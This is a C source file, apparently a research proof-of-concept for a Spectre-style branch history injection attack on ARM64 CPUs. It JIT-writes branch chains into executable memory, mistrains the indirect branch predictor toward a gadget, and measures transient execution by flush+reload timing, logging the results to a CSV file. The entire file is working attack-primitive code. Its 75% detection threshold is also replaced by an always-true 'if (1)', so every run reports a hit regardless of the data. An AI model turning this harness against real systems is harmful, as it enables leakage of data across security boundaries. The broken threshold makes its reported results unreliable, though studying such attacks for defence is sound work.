#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <time.h>
#include "targets.h"
#include "helper.h"

#define MAX_HISTORY         (1024)
#define DEFAULT_HISTORY     (64)
#define DEFAULT_ITER        (1000)
#define DEFAULT_TRAIN       (8)

#define B_OPCODE            (0x14000000U)
#define B_OFF_MASK_OPC      (0x03ffffffU)
#define B_OFF_MASK          (0x01ffffffU)
#define MAX_MEM             (0x04000000ULL<<2)

typedef uint64_t (*t_chain)(void *target, void *arg);
typedef void (*t_target)(void *target);
extern void ret_gadget(void *arg);
extern void hit_gadget(void *arg);
extern void ind_gadget(void *arg);

t_target ftable[2] = {&ret_gadget, hit_gadget};

static int hist_size, iters, train_n;

static uint64_t addr_rand(void)
{
    return (uint64_t)((rand() & B_OFF_MASK)) << 2;
}

static void jit(uint8_t *mem, uint64_t *history)
{
    for (int i = 0; i < hist_size - 1; i++) {
        uint32_t offset = (uint32_t)((history[i+1] >> 2) - (history[i] >> 2));
        uint32_t opcode = B_OPCODE | (offset & B_OFF_MASK_OPC);
        memcpy(&mem[history[i]], &opcode, 4);
        __clear_cache(&mem[history[i]], &mem[history[i]+4]);
    }
    /* 注意：&ind_gadget 的值就是其代码首地址，这一句拷贝的是真实指令字节
       ldr x0,[x0] / br x0 —— 不要改成 ind_gadget 的其他写法 */
    memcpy(&mem[history[hist_size-1]], (void*)&ind_gadget, 8);
    __clear_cache(&mem[history[hist_size-1]], &mem[history[hist_size-1]+8]);
}

static int env_int(const char *k, int d)
{
    const char *v = getenv(k);
    return v ? atoi(v) : d;
}

int main(int argc, char **argv)
{
    uint8_t *fr_buf, *mem;
    uint64_t hit_history[MAX_HISTORY], ret_history[MAX_HISTORY];
    int hits, round = 0;

    hist_size = env_int("HIST", DEFAULT_HISTORY);
    iters     = env_int("ITER", DEFAULT_ITER);
    train_n   = env_int("TRAIN", DEFAULT_TRAIN);
    if (hist_size < 2 || hist_size > MAX_HISTORY) { fprintf(stderr, "HIST 越界\n"); return 1; }

    /* 无定制内核：不再调用 BHI_ENABLE_SYSCALL，计时走 cntvct_el0 */
    srand(time(0) ^ getpid());

    fr_buf = mmap(NULL, STRIDE, PROT_READ|PROT_WRITE,
                  MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (fr_buf == MAP_FAILED) { perror("mmap fr_buf"); return 1; }
    memset(fr_buf, 0x41, STRIDE);

    mem = mmap(NULL, MAX_MEM, PROT_READ|PROT_WRITE|PROT_EXEC,
               MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap mem"); return 1; }
    printf("rwx mem: %p\n", mem);
    clock_start();
    printf("[cfg] HIST=%d ITER=%d TRAIN=%d THR=%d\n", hist_size, iters, train_n, THR);

    /* ---------- gate-1: F+R ruler ---------- */
    {
        uint64_t mh = 0, mm = 0;
        for (int i = 0; i < 1000; i++) { maccess(fr_buf); mh += load_time(fr_buf); }
        for (int i = 0; i < 1000; i++) { clflush(fr_buf); fence(); mm += load_time(fr_buf); }
        printf("[ruler] cached=%.2f flushed=%.2f THR=%d %s\n",
               (double)mh/1000, (double)mm/1000, THR,
               (mm > mh + 2) ? "OK" : "WARN:no-sep");
    }

    /* 建 hit 链 */
    for (int i = 0; i < hist_size; i++) hit_history[i] = addr_rand();
    jit(mem, hit_history);
    t_chain hit_ptr = (t_chain)&mem[hit_history[0]];
    hit_ptr(&ftable[1], fr_buf);

    /* ---------- gate-2: SELF 全同链正对照 ----------
       训练链与测试链逐位相同 => 到达 ind_gadget 时 BHB 历史完全一致 =>
       预测必然指向 hit_gadget，而架构上喂 &ftable[0] => 必然有瞬态窗口。
       这一项是"harness 到底能不能抓到瞬态"的唯一判据。 */
    int g_nospec = env_int("NOSPEC", 0);
    int g_share = env_int("SHARE", 1);
    if (env_int("SELFTEST", 1)) {
        for (int i = 0; i < hist_size; i++) ret_history[i] = hit_history[i];
        jit(mem, ret_history);
        t_chain self_ptr = (t_chain)&mem[ret_history[0]];
        self_ptr(&ftable[1], fr_buf);
        int n = 1000, ok = 0;
        for (int i = 0; i < n; i++) {
            for (int t = 0; t < train_n; t++) self_ptr(&ftable[1], fr_buf);
            if (!g_nospec) { clflush(&ftable[0]); clflush(&ftable[1]); }
            clflush(fr_buf);
            self_ptr(&ftable[0], fr_buf);
            if (load_time(fr_buf) < THR) ok++;
        }
        printf("[SELF] %d/%d = %.1f%%  <- 这是 gate-2，必须高，否则后面全是废数据\n",
               ok, n, 100.0*ok/n);
        fflush(stdout);
        /* SELF 结束时 mem 即为 hit 链状态，主循环会自行重建，无需还原 */
    }

    while (1) {
        round++;
        hits = 0;

        printf("\r[Round %d] hist=%d ", round, hist_size);
        fflush(stdout);

        for (int i = 0; i < hist_size; i++) {
            int ok;
            do {
                ok = 1;
                uint64_t r = addr_rand();
                for (int j = 0; j < hist_size; j++)
                    if (labs((int64_t)(r - hit_history[j])) < 16) { ok = 0; break; }
                for (int j = 0; j < i && ok; j++)
                    if (labs((int64_t)(r - ret_history[j])) < 16) { ok = 0; break; }
                if (ok) ret_history[i] = r;
            } while (!ok);
        }

#if IN_PLACE == 1
        for (int s = 0; s < g_share && s < hist_size; s++)
            ret_history[hist_size-1-s] = hit_history[hist_size-1-s];
#endif

        jit(mem, ret_history);
        t_chain ret_ptr = (t_chain)&mem[ret_history[0]];

        for (int i = 0; i < iters; i++) {
            for (int t = 0; t < train_n; t++) hit_ptr(&ftable[1], fr_buf);
            clflush(&ftable[0]);
            clflush(&ftable[1]);
            clflush(fr_buf);
            ret_ptr(&ftable[0], fr_buf);
            if (load_time(fr_buf) < THR) hits++;
        }

        /* 噪声底：真碰撞应 > 90%，这里门槛放在 75% */
        if (1) {
            printf("\n[FOUND] round=%d %d/%d (%.1f%%) - replaying\n",
                   round, hits, iters, 100.0*hits/iters);

            FILE *f = fopen("raw.csv", "w");
            fprintf(f, "mode,iter,dt,hit\n");
            int M = 2000, cmain = 0, cctrl = 0, cpos = 0;
            uint64_t dt; int h;

            for (int k = 0; k < M; k++) {              /* CTRL: 训练到安全目标 */
                for (int t = 0; t < train_n; t++) hit_ptr(&ftable[0], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
                ret_ptr(&ftable[0], fr_buf);
                dt = load_time(fr_buf); h = dt < THR; cctrl += h;
                fprintf(f, "CTRL,%d,%lu,%d\n", k, dt, h);
            }
            for (int k = 0; k < M; k++) {              /* MAIN: 训练到 hit_gadget */
                for (int t = 0; t < train_n; t++) hit_ptr(&ftable[1], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
                ret_ptr(&ftable[0], fr_buf);
                dt = load_time(fr_buf); h = dt < THR; cmain += h;
                fprintf(f, "MAIN,%d,%lu,%d\n", k, dt, h);
            }
            for (int k = 0; k < M; k++) {              /* POS: flush fr_buf 后再架构真跳 */
                hit_ptr(&ftable[1], fr_buf);
                clflush(&ftable[0]); clflush(&ftable[1]);
                clflush(fr_buf);
                ret_ptr(&ftable[1], fr_buf);
                dt = load_time(fr_buf); h = dt < THR; cpos += h;
                fprintf(f, "POS,%d,%lu,%d\n", k, dt, h);
            }
            fclose(f);
            printf("[MAIN] trained  = %d/%d (%.1f%%)\n", cmain, M, 100.0*cmain/M);
            printf("[CTRL] mistrain = %d/%d (%.1f%%)\n", cctrl, M, 100.0*cctrl/M);
            printf("[POS]  forced   = %d/%d (%.1f%%)\n", cpos,  M, 100.0*cpos/M);
            printf("wrote raw.csv (%d rows)\n", 3*M);
            break;
        }
    }
    return 0;
}
